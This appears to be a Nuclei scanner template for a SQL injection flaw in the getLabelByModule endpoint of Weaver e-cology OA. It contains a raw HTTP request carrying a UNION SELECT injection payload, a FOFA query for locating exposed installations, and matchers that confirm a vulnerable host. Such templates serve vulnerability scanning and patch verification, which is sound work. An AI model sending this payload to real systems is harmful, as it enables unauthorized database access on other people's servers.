id: weaver-ecology-getLabelByModule-sqli
info:
  name: 泛微 OA E-Cology getLabelByModule - sqli
  author: leadlife
  severity: high
  description: 
  reference:
    - https://wiki.wy876.cn/#/%E6%B3%9B%E5%BE%AEe-cology%E6%8E%A5%E5%8F%A3getLabelByModule%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="泛微-OA（e-cology）"
  tags: weaver,sqli,ecology,oa
 
http:
  - raw:
      - |
        GET /api/ec/dev/locale/getLabelByModule?moduleCode=?moduleCode=?moduleCode=aaa')+union+all+select+'1,1123123'+-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
        X-Requested-With: XMLHttpRequest
        Accept: application/json, text/javascript, */*; q=0.01
        Accept-Encoding: gzip, deflate, br
        Accept-Language: zh-CN,zh;q=0.9b
        Connection: close
 
    matchers:
      - type: dsl
        dsl:
          - status_code == 200
          - contains(body_1,'1123123')
        condition: and
